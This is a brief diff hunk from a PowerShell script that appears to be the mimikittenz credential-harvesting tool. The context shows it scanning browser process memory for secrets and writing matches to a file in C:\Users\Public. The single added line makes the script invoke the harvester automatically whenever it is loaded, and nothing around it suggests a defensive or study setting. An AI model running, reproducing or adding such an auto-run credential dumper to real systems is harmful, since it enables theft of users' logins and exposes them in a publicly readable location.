@@ -533,3 +533,4 @@ $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrom
 
 write-output $matchesFound | Out-File -Path C:\Users\Public\yup.txt
 }
+invoke-mimikittenz
